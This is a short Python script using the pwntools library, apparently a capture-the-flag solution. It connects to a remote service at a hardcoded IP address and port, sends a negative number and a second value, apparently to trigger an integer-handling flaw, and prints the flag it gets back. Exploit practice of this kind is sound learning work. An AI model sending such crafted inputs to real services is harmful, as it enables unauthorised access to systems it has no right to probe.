from pwn import *

p = remote('141.85.224.106', 31338)

p.sendline('-2147')
p.sendline('18')

print(f"Flag: {p.recvall()}")

p.close()
